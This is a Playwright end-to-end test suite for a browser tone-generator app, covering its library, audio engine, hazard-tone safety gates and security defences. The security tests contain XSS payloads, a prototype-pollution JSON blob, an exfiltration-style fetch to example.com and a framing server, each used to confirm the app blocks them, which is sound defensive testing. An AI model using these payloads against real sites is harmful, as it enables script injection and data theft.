#!/usr/bin/env node
// shepherd.freq — end-to-end test suite
//   npm i --no-save playwright && npx playwright install chromium   (once)
//   node tests/run.mjs                 (PW_CHROMIUM=/path/to/chrome to use a local browser)
// Serves the repo with production headers (tests/serve.mjs) and drives a real
// Chromium through every feature, every safety gate and a set of attacks.
import { chromium } from 'playwright';
import { spawn } from 'node:child_process';
import http from 'node:http';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const PORT = 3271, EVIL = 3272, U = `http://localhost:${PORT}/`;
const here = path.dirname(new URL(import.meta.url).pathname);
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'shepherd-'));
const results = [];
const check = (group, name, ok, detail = '') => results.push({ group, name, ok: !!ok, detail });

const server = spawn(process.execPath, [path.join(here, 'serve.mjs'), String(PORT)], { stdio: 'ignore' });
const evil = http.createServer((q, r) => { r.writeHead(200, { 'Content-Type': 'text/html' }); r.end(`<iframe src="${U}" width=800 height=600></iframe>`); }).listen(EVIL);
await new Promise(r => setTimeout(r, 600));

const browser = await chromium.launch(process.env.PW_CHROMIUM ? { executablePath: process.env.PW_CHROMIUM } : {});
const VIOL = `addEventListener('securitypolicyviolation',e=>{(window.__v=window.__v||[]).push(e.violatedDirective)})`;
async function page({ ack = true, vp = { width: 1440, height: 900 }, mobile = false, init } = {}) {
  const ctx = await browser.newContext({ viewport: vp, isMobile: mobile, hasTouch: mobile, acceptDownloads: true });
  await ctx.addInitScript(VIOL);
  if (ack) await ctx.addInitScript(() => { try { localStorage.setItem('shepherd.freq.ack', '1'); } catch (_) {} });
  if (init) await ctx.addInitScript(init);
  const p = await ctx.newPage();
  p.errors = []; p.dialogs = [];
  p.on('pageerror', e => p.errors.push(e.message));
  p.on('dialog', d => { p.dialogs.push(d.message()); d.dismiss(); });
  return { ctx, p };
}
const ev = (p, f, a) => p.evaluate(f, a);
const wait = ms => new Promise(r => setTimeout(r, ms));
const addLib = async (p, text) => { await p.fill('#srch', ''); await p.click(`.frow:has-text("${text}")`); };

try {
  // ── 1 · LOAD ──────────────────────────────────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(3200);
    const st = await ev(p, () => ({
      font: document.fonts.check('300 20px Inter'), img: document.querySelector('.vista').naturalWidth,
      lit: document.body.classList.contains('lit'), rows: document.querySelectorAll('.frow').length,
      v: window.__v || [], tt: !!window.trustedTypes?.defaultPolicy, coi: self.crossOriginIsolated,
    }));
    check('load', 'font, image and reveal', st.font && st.img === 736 && st.lit);
    check('load', 'library renders all entries', st.rows === 114, st.rows);
    check('load', 'no CSP violations', st.v.length === 0, st.v.join());
    check('load', 'Trusted Types policy + cross-origin isolation', st.tt && st.coi);
    check('load', 'service worker active', await ev(p, async () => !!(await navigator.serviceWorker.ready).active));
    await ctx.setOffline(true); await p.reload(); await wait(1500);
    check('load', 'reloads fully offline', await ev(p, () => document.querySelector('.vista').naturalWidth === 736 && document.querySelectorAll('.frow').length > 100));
    check('load', 'no page errors', p.errors.length === 0, p.errors.join(' | '));
    await ctx.close();
  }

  // ── 2 · LIBRARY, SEARCH, FILTERS, SKULLS ─────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1500);
    await p.fill('#srch', '432'); await wait(100);
    check('library', 'search narrows results', (await p.$$('.frow')).length >= 1 && (await p.$$('.frow')).length < 10);
    await p.fill('#srch', 'zzzz'); await wait(100);
    check('library', 'empty search shows message', await p.isVisible('.flib-empty'));
    await p.fill('#srch', '');
    const counts = await ev(p, () => Object.fromEntries([...document.querySelectorAll('.evc[data-k]')].filter(b => b.dataset.k !== 'clear').map(b => [b.dataset.k, +b.querySelector('b').textContent])));
    for (const k of ['claim', 'mix', 'doc', 'em', 'haz', 'ref', 'concept', 'danger']) {
      await p.click(`.evc[data-k=${k}]`); await wait(60);
      const n = (await p.$$('.frow')).length;
      check('library', `colour filter "${k}" shows exactly its ${counts[k]} entries`, n === counts[k] && n > 0, `${n} vs ${counts[k]}`);
      await p.click(`.evc[data-k=${k}]`);
    }
    await p.click('.evc[data-k=claim]'); await p.click('.evc[data-k=danger]'); await wait(60);
    check('library', 'filters combine', (await p.$$('.frow')).length >= counts.claim + 1);
    await p.click('.evc.clr'); await wait(60);
    check('library', 'clear resets filters', (await p.$$('.frow')).length === 114);
    await p.click('.evc[data-k=danger]');
    check('library', 'every "extreme" row carries a skull', await ev(p, () => [...document.querySelectorAll('.frow')].every(r => r.querySelector('.skull'))));
    await p.click('.evc.clr');
    check('library', 'skull filter = 14 (12 hazard tones + 2 mute charges)', counts.danger === 14, counts.danger);
    await p.focus('.frow >> nth=3'); await p.keyboard.press('Enter'); await wait(150);
    check('library', 'keyboard Enter adds a tone', await ev(p, () => tones.length === 1));
    await addLib(p, 'Verdi A (432 Hz)'); await wait(100);
    check('library', 'click adds a tone + row marked used', await ev(p, () => tones.length === 2 && !!document.querySelector('.frow.used')));
    await p.fill('#chz', '99999'); await p.click('#caddbtn');
    check('library', 'custom Hz above 22 kHz rejected', await ev(p, () => tones.length === 2));
    await p.fill('#chz', '123.45'); await p.fill('#cname', 'mine'); await p.press('#cname', 'Enter'); await wait(100);
    check('library', 'custom Hz + label added', await ev(p, () => tones.at(-1).hz === 123.45 && tones.at(-1).name === 'mine'));
    await ctx.close();
  }

  // ── 3 · TONES & AUDIO ENGINE ─────────────────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1200);
    await addLib(p, 'Verdi A (432 Hz)'); await addLib(p, 'solfeggio 528 Hz');
    await p.click('.tc >> nth=0 >> [data-a=toggle]'); await wait(300);
    check('tones', 'card play starts one oscillator', await ev(p, () => ENG.nodes.size === 1 && tones[0].playing && ENG.ctx.state === 'running'));
    await p.click('.tc >> nth=0 >> .sbtn[data-ch=left]'); await wait(100);
    check('tones', 'channel → pan −1', await ev(p, () => tones[0].channel === 'left' && [...ENG.nodes.values()][0].pan.pan.value <= -0.99 + 1e-6 || [...ENG.nodes.values()][0].pan.pan.value < 0));
    await p.selectOption('.tc >> nth=0 >> select[data-a=wave]', 'square');
    check('tones', 'waveform applied', await ev(p, () => [...ENG.nodes.values()][0].osc.type === 'square'));
    await p.$eval('.tc >> nth=0 >> input[data-a=vol]', el => { el.value = '0.3'; el.dispatchEvent(new Event('input', { bubbles: true })); });
    check('tones', 'volume applied', await ev(p, () => tones[0].volume === 0.3));
    await p.selectOption('.tc >> nth=0 >> select[data-a=pulse]', '10'); await wait(200);
    check('tones', 'pulse adds an LFO gate', await ev(p, () => !!ENG.nodes.get(tones[0].id)?.lfo && ENG.nodes.get(tones[0].id).lfo.frequency.value === 10));
    await p.click('#gbtn'); await wait(300);   // something is sounding → global button stops everything
    check('tones', 'global button stops when anything sounds', await ev(p, () => ENG.nodes.size === 0 && !tones.some(t => t.playing)));
    await p.click('#gbtn'); await wait(300);
    check('tones', 'global button plays every tone', await ev(p, () => tones.every(t => t.playing) && ENG.nodes.size === 2));
    await p.$eval('#mvol', el => { el.value = '0.4'; el.dispatchEvent(new Event('input', { bubbles: true })); });
    check('tones', 'master volume', await ev(p, () => ENG.vol === 0.4));
    await p.click('#stopallbtn'); await wait(200);
    check('tones', 'stop all', await ev(p, () => ENG.nodes.size === 0 && !tones.some(t => t.playing)));
    check('tones', 'hero shows the latest tone', (await p.textContent('#heroHz')).length > 0);
    await p.reload(); await wait(1200);
    check('tones', 'tones persist across reload (with settings)', await ev(p, () => tones.length === 2 && tones[0].channel === 'left' && tones[0].waveform === 'square' && tones[0].pulse === 10));
    await p.click('.tc >> nth=0 >> [data-a=remove]'); await wait(100);
    check('tones', 'remove tone', await ev(p, () => tones.length === 1));
    await ev(p, () => { for (let i = 0; i < 60; i++) newTone({ hz: 100 + i, name: 'x', cat: 'reference' }); });
    check('tones', '48-tone cap', await ev(p, () => tones.length === 48));
    check('tones', 'no page errors', p.errors.length === 0, p.errors.join(' | '));
    await ctx.close();
  }

  // ── 4 · INTERVALS ────────────────────────────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1200);
    await p.click('.ctab[data-sub=int]');
    const prev = () => ev(p, () => [...document.querySelectorAll('#iprev .pv')].map(e => e.textContent.replace(/Hz|[LR]$/g, '').replace(/[^\d.]/g, '')));
    const sets = () => ev(p, () => buildSet().set.map(t => `${t.hz}${t.channel[0]}`).join(' '));
    check('intervals', 'beat 10 Hz binaural → 200 L / 210 R', (await sets()) === '200l 210r', await sets());
    await p.click('#ibtype .sbtn[data-v=monaural]');
    check('intervals', 'monaural → both channels', (await sets()) === '200b 210b');
    await p.click('#ibeatp .chip[data-v="6"]');
    check('intervals', 'theta preset → 206', (await sets()) === '200b 206b');
    await p.click('#imode .sbtn[data-m=harm]');
    check('intervals', 'harmonics ×4 → 200 400 600 800', (await sets()) === '200b 400b 600b 800b');
    await p.click('#imode .sbtn[data-m=ratio]');
    check('intervals', 'fifth ×3 → 200 300 450', (await sets()) === '200b 300b 450b');
    await p.click('#imode .sbtn[data-m=step]');
    check('intervals', 'step +111 ×3 → 200 311 422', (await sets()) === '200b 311b 422b');
    await p.fill('#ibase', '21900'); await wait(50);   // 21900 ok · 22011 and 22122 exceed 22 kHz
    check('intervals', 'out-of-range tones dropped', (await sets()) === '21900b' && (await p.textContent('#iprev')).includes('2 tones outside'), await sets());
    await p.fill('#ibase', '200'); await p.selectOption('#ipulse', '10'); await p.click('#iplay'); await wait(500);
    check('intervals', 'add & play: 3 pulsing tones sounding', await ev(p, () => tones.length === 3 && tones.every(t => t.playing && t.pulse === 10)));
    check('intervals', 'preview rendered', (await prev()).length === 3);
    await ctx.close();
  }

  // ── 5 · INSIGHT ANALYSIS ─────────────────────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1200);
    const a = (x, y, cx = 'both', cy = 'both') => ev(p, ([x, y, cx, cy]) => analyzePair({ hz: x, channel: cx, cat: 'reference' }, { hz: y, channel: cy, cat: 'reference' }).tags.map(t => t[1]).join(' | '), [x, y, cx, cy]);
    check('insight', '200 L + 210 R → binaural 10 Hz alpha', /binaural 10 Hz.*alpha/.test(await a(200, 210, 'left', 'right')), await a(200, 210, 'left', 'right'));
    check('insight', '200 + 206 same ear → beating 6 Hz theta', /beating 6 Hz.*theta/.test(await a(200, 206)));
    check('insight', '400 + 450 → rough', /rough 50 Hz/.test(await a(400, 450)));
    check('insight', '200 + 300 → perfect fifth, consonant', /perfect fifth.*consonant/.test(await a(200, 300)));
    check('insight', '220 + 440 → octave', /octave/.test(await a(220, 440)));
    check('insight', '7.83 + 40 → sub-audio', /sub-audio/.test(await a(7.83, 40)));
    check('insight', 'skull pair tagged extreme caution', await ev(p, () => analyzePair({ hz: 2500, cat: 'lrad', channel: 'both' }, { hz: 440, cat: 'reference', channel: 'both' }).tags[0][1] === 'extreme caution'));
    await addLib(p, 'solfeggio 528 Hz'); await addLib(p, 'mosquito device low'); await addLib(p, 'infrasound 7 Hz');
    await p.click('.ctab[data-sub=ins]'); await wait(200);
    const applies = await ev(p, () => [...document.querySelectorAll('.nt.now h4')].map(h => h.firstChild.textContent));
    for (const t of ['hearing safety', 'extreme caution tones', 'high frequencies · above ~15 kHz', 'infrasound · below 20 Hz', 'glass & resonance', 'healing claims', 'not medical advice'])
      check('insight', `note applies: ${t}`, applies.includes(t), applies.join(', '));
    check('insight', '3 tones → 3 pairs', (await p.$$('.pair')).length === 3);
    await ctx.close();
  }

  // ── 6 · SAFETY GATES ─────────────────────────────────────
  {
    const { ctx, p } = await page({ ack: false });
    await p.goto(U); await wait(1200);
    await addLib(p, 'Verdi A (432 Hz)');
    await p.click('.tc >> nth=0 >> [data-a=toggle]'); await wait(200);
    check('safety', 'first-listen notice before any sound', await p.isVisible('#ack') && await ev(p, () => ENG.nodes.size === 0));
    await p.click('#ackno'); await wait(100);
    check('safety', '"not now" keeps silence', await ev(p, () => ENG.nodes.size === 0) && !(await p.isVisible('#ack')));
    await p.click('.tc >> nth=0 >> [data-a=toggle]'); await p.click('#ackyes'); await wait(300);
    check('safety', '"I understand" plays and is remembered', await ev(p, () => ENG.nodes.size === 1 && localStorage.getItem('shepherd.freq.ack') === '1'));
    await addLib(p, 'LRAD midpoint');
    check('safety', 'skull tone added at 20 % volume', await ev(p, () => tones.at(-1).volume === 0.2));
    await p.click('.tc >> nth=1 >> [data-a=toggle]'); await wait(200);
    check('safety', 'extreme-caution warning, cancel focused', await p.isVisible('#danger') && await ev(p, () => document.activeElement.id === 'dgno'));
    await p.keyboard.press('Escape'); await wait(100);
    check('safety', 'Escape cancels — skull tone silent', await ev(p, () => !tones[1].playing) && !(await p.isVisible('#danger')));
    await p.click('.tc >> nth=1 >> [data-a=toggle]'); await p.click('#dgyes'); await wait(300);
    check('safety', '"play quietly" plays the skull tone', await ev(p, () => tones[1].playing));
    await addLib(p, 'mosquito device low'); await p.click('.tc >> nth=2 >> [data-a=toggle]'); await wait(200);
    check('safety', 'warning asked once per session', await ev(p, () => tones[2].playing) && !(await p.isVisible('#danger')));
    await ctx.close();
  }

  // ── 7 · MUTE CHARGE ──────────────────────────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1200);
    await p.click('.ctab[data-sub=mute]'); await wait(150);
    check('mute', 'three charges shown', (await p.$$('.charge')).length === 3);
    const modes = await ev(p, () => roomModes(4, 3.5, 2.6).map(m => m.f));
    check('mute', 'room modes: 4 m → 171.5 Hz (n=4)', modes.includes(171.5), modes.join(' '));
    check('mute', 'room modes: 3.5 m → 196 Hz, 2.6 m → 197.88 Hz', modes.includes(196) && modes.includes(197.88));
    check('mute', 'default picks in-band mode nearest 175', (await p.textContent('#roomHz')).startsWith('171.5'));
    check('mute', 'in-band modes highlighted', (await p.$$('.mode.band')).length === 3);
    await p.fill('#roomL', '5'); await wait(80);
    check('mute', 'modes follow room size (5 m → 171.5 via n=5)', await ev(p, () => roomModes(5, 3.5, 2.6).some(m => m.f === 171.5)));
    await p.fill('#roomL', '0.2'); await wait(80);
    check('mute', 'invalid room size rejected', (await p.textContent('#modehint')).includes('between'));
    await p.fill('#roomL', '4'); await wait(80);
    await p.click('.mode:has-text("196")'); await wait(50);
    check('mute', 'tap a mode selects it', (await p.textContent('#roomHz')).startsWith('196'));
    await p.click('[data-arm=room]:not([data-play])'); await wait(150);
    check('mute', 'arm room → 196 Hz tone, PEMF/research domain', await ev(p, () => tones.at(-1).hz === 196 && tones.at(-1).cat === 'mutecharge' && /PEMF/.test(tones.at(-1).desc)));
    await p.click('#roomkind .sbtn[data-v=sweep]'); await p.click('[data-arm=room][data-play]'); await wait(1500);
    const f1 = await ev(p, () => ENG.nodes.get(tones.at(-1).id)?.osc.frequency.value);
    await wait(2000);
    const f2 = await ev(p, () => ENG.nodes.get(tones.at(-1).id)?.osc.frequency.value);
    check('mute', 'sweep 150→200 rises over time', f1 > 150 && f2 > f1 && f2 < 200, `${f1} → ${f2}`);
    check('mute', 'sweep card shows 150–200', (await p.textContent('.tc:last-child .tc-hz')).includes('150–200'));
    await p.click('#stopallbtn'); await ev(p, () => { tones.length = 0; renderTones(); });
    await p.click('.ctab[data-sub=mute]');
    await p.click('[data-arm=all][data-play]'); await wait(200);
    check('mute', 'arm all & play asks extreme-caution first', await p.isVisible('#danger') && await ev(p, () => tones.length === 0));
    await p.click('#dgyes'); await wait(400);
    const t = await ev(p, () => tones.map(t => [t.hz, t.volume, isDanger(t), t.playing]));
    check('mute', 'arms 18.98 / room / 2500, all playing', t.length === 3 && t[0][0] === 18.98 && t[2][0] === 2500 && t.every(x => x[3]), JSON.stringify(t));
    check('mute', 'infrasound + saturation charges skull-marked at 20 %', t[0][2] && t[2][2] && t[0][1] === 0.2 && t[2][1] === 0.2 && !t[1][2]);
    await p.click('.ctab[data-sub=ins]'); await wait(150);
    const n = await ev(p, () => [...document.querySelectorAll('.nt.now h4')].map(h => h.firstChild.textContent));
    check('mute', 'insight: "concept, not silence" + room-modes notes', n.includes('mute charge is a concept, not silence') && n.includes('room modes'), n.join(', '));
    check('mute', 'no page errors', p.errors.length === 0, p.errors.join(' | '));
    await ctx.close();
  }

  // ── 8 · SECURITY ─────────────────────────────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1500);
    await p.fill('#chz', '432'); await p.fill('#cname', '<img src=x onerror=alert(1)>'); await p.click('#caddbtn'); await wait(200);
    check('security', 'XSS in label shown as inert text', (await p.$eval('.tc-name', e => e.textContent)) === '<img src=x onerror=alert(1)>' && (await p.$$('#tgrid img')).length === 0);
    const sink = await ev(p, () => { document.body.insertAdjacentHTML('beforeend', '<img id=z src=x onerror="window.__p=1"><script>window.__p=2<\/script><a id=y href="javascript:window.__p=3">a</a>'); return [document.getElementById('z').getAttribute('onerror'), !!document.querySelector('body > script:not([src])') && document.querySelectorAll('script').length > 1, document.getElementById('y').getAttribute('href')]; });
    check('security', 'HTML sinks sanitized (handlers, scripts, js: URLs)', sink[0] === null && sink[1] === false && sink[2] === null, JSON.stringify(sink));
    check('security', 'string eval refused', await ev(p, () => { try { setTimeout('window.__p=4', 0); return false; } catch (e) { return true; } }));
    check('security', 'rogue Trusted Types policy refused', await ev(p, () => { try { trustedTypes.createPolicy('x', { createHTML: s => s }); return false; } catch (e) { return true; } }));
    check('security', 'exfiltration fetch blocked', await ev(p, async () => { try { await fetch('https://example.com/?' + localStorage.length); return false; } catch (e) { return true; } }));
    check('security', 'built-in prototypes frozen', await ev(p, () => Object.isFrozen(Object.prototype) && Object.isFrozen(Array.prototype)));
    await wait(300);
    check('security', 'nothing executed, no dialogs', (await ev(p, () => window.__p ?? null)) === null && p.dialogs.length === 0);
    await p.click('.ctab[data-sub=spk]');
    const [dl] = await Promise.all([p.waitForEvent('download'), p.click('#dlbtn')]);
    const single = path.join(tmp, 'single.html'); await dl.saveAs(single);
    await ctx.close();

    const { ctx: c2, p: p2 } = await page({ init: () => {
      const e = JSON.parse('{"__proto__":{"polluted":1},"vol":"9","tones":[{"__proto__":{"polluted":1},"id":"1","hz":"1e3","name":"<svg onload=alert(2)>","cat":"__proto__","volume":99,"deviceId":{"a":1}}]}');
      for (let i = 0; i < 4000; i++) e.tones.push({ id: i, hz: 440 });
      localStorage.setItem('shepherd.freq.v1', JSON.stringify(e));
    } });
    await p2.goto(U); await wait(1200);
    const ps = await ev(p2, () => ({ pol: ({}).polluted ?? null, n: tones.length, cat: tones[0].cat, vol: ENG.vol, ids: new Set(tones.map(t => t.id)).size === tones.length, svg: document.querySelectorAll('svg[onload]').length }));
    check('security', 'poisoned storage: no pollution, capped, sanitized', ps.pol === null && ps.n === 48 && ps.cat === 'reference' && ps.vol === 1 && ps.ids && ps.svg === 0, JSON.stringify(ps));
    await c2.close();

    const { ctx: c3, p: p3 } = await page({ init: () => { navigator.mediaDevices.enumerateDevices = async () => [{ kind: 'audiooutput', deviceId: 'default', label: 'Default' }, { kind: 'audiooutput', deviceId: 'x"><img src=x onerror=alert(3)>', label: 'JBL <img src=x onerror=alert(4)>‮' + 'A'.repeat(300) }]; } });
    await p3.goto(U); await wait(1200); await p3.click('.ctab[data-sub=spk]');
    check('security', 'hostile bluetooth name inert and capped', await ev(p3, () => document.querySelectorAll('#devlist img').length === 0 && [...document.querySelectorAll('.dev-name')].every(e => e.textContent.length <= 64 && !e.textContent.includes('‮'))) && p3.dialogs.length === 0);
    await c3.close();

    const { ctx: c4, p: p4 } = await page();
    await p4.goto(`http://127.0.0.1:${EVIL}/`); await wait(1500);
    const fr = p4.frames().find(f => f.url().startsWith(U));
    const framedLen = fr ? await fr.evaluate(() => document.body?.innerText.length || 0).catch(() => 0) : 0;
    check('security', 'cannot be framed by another site', framedLen === 0);
    await c4.close();

    const { ctx: c5, p: p5 } = await page();
    await p5.goto(U); await wait(1500);
    await ev(p5, async () => { await fetch('/assets/vista.webp?poison=1'); await fetch('/README.md').catch(() => 0); });
    const keys = await ev(p5, async () => { const k = []; for (const n of await caches.keys()) for (const r of await (await caches.open(n)).keys()) k.push(new URL(r.url).pathname + new URL(r.url).search); return k; });
    check('security', 'service-worker cache holds allow-list only', keys.length === 8 && keys.every(k => !k.includes('?') && !k.includes('README')), keys.join(' '));
    await c5.close();

    const c6 = await browser.newContext(); await c6.addInitScript(VIOL);
    await c6.route('**/*', r => /^(file|data|blob):/.test(r.request().url()) ? r.continue() : r.abort());
    const p6 = await c6.newPage(); await p6.goto('file://' + single); await wait(2200);
    const s6 = await ev(p6, () => ({ font: document.fonts.check('300 20px Inter'), img: document.querySelector('.vista').naturalWidth, v: window.__v || [], rows: document.querySelectorAll('.frow').length }));
    check('security', 'single file: offline, CSP intact, fully styled', s6.font && s6.img === 736 && s6.v.length === 0 && s6.rows === 114, JSON.stringify(s6));
    await c6.close();
  }

  // ── 9 · RESPONSIVE ───────────────────────────────────────
  for (const [w, h, mobile] of [[1920, 947, 0], [1440, 900, 0], [1100, 640, 0], [820, 1180, 1], [390, 844, 1], [844, 390, 1], [360, 640, 1]]) {
    const { ctx, p } = await page({ vp: { width: w, height: h }, mobile: !!mobile });
    await p.goto(U); await wait(1300);
    const over = await ev(p, () => document.documentElement.scrollWidth > innerWidth || document.body.scrollWidth > innerWidth);
    check('responsive', `${w}×${h}: no horizontal overflow`, !over);
    const compact = await ev(p, () => isCompact());
    if (compact) {
      for (const tab of ['lib', 'int', 'main', 'ins', 'spk']) {
        await p.click(`.mobt[data-tab=${tab}]`); await wait(350);
        const vis = await ev(p, t => { const id = t === 'main' ? 'panel-main' : (t === 'lib' || t === 'int') ? 'panel-lib' : 'panel-spk'; const r = document.getElementById(id).getBoundingClientRect(); return r.height > 80 && r.bottom <= innerHeight + 1; }, tab);
        check('responsive', `${w}×${h}: tab "${tab}" visible`, vis);
      }
      await p.click('.mobt[data-tab=int]'); await p.click('#panel-lib .ctab[data-sub=mute]'); await wait(200);
      check('responsive', `${w}×${h}: mute charge reachable`, await p.isVisible('.charge'));
    } else {
      check('responsive', `${w}×${h}: both columns + stage visible`, await p.isVisible('#panel-lib') && await p.isVisible('#panel-spk') && await p.isVisible('.vista'));
    }
    check('responsive', `${w}×${h}: no page errors`, p.errors.length === 0, p.errors.join(' | '));
    await ctx.close();
  }
} catch (e) {
  check('runner', 'suite crashed', false, e.stack?.split('\n').slice(0, 3).join(' '));
} finally {
  await browser.close(); server.kill(); evil.close();
}

let group = '';
for (const r of results) {
  if (r.group !== group) { group = r.group; console.log(`\n${group}`); }
  console.log(`  ${r.ok ? 'PASS' : 'FAIL'}  ${r.name}${r.ok || !r.detail ? '' : `  → ${r.detail}`}`);
}
const failed = results.filter(r => !r.ok).length;
console.log(`\n${results.length - failed}/${results.length} passed`);
process.exit(failed ? 1 : 0);
